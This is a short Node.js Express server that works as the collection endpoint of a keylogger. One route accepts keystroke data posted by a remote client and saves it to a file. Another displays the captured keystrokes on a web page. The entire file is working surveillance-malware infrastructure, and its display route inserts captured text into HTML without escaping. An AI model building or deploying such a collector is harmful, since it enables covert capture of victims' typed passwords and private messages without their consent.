const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

const app = express();

// Use body-parser to parse JSON bodies
app.use(bodyParser.json({ extended: true }));

const port = 8080;

// Route to handle GET requests and display logged keystrokes
app.get("/", (req, res) => {
    try {
        // Read the keystrokes from the file
        const kl_file = fs.readFileSync("./keystroke_captures.txt", { encoding: 'utf8', flag: 'r' });
        
        // Replace newline characters with <br> for HTML formatting
        res.send(`<h1>Logged data</h1><p>${kl_file.replace("\n", "<br>")}</p>`);
    } catch {
        // If file doesn't exist or any error occurs, send a message indicating no data
        res.send("<h1>Nothing Logged yet.</h1>");
    }
});

// Route to handle POST requests and save the keystrokes data
app.post("/", (req, res) => {
    console.log(req.body.keyboardData);
    
    // Write the received keystrokes data to the file
    fs.writeFileSync("keystroke_captures.txt", req.body.keyboardData);
    res.send("Successfully set the data");
});

// Start the server and listen on the specified port
app.listen(port, () => {
    console.log(`Server is listening on port ${port}`);
});
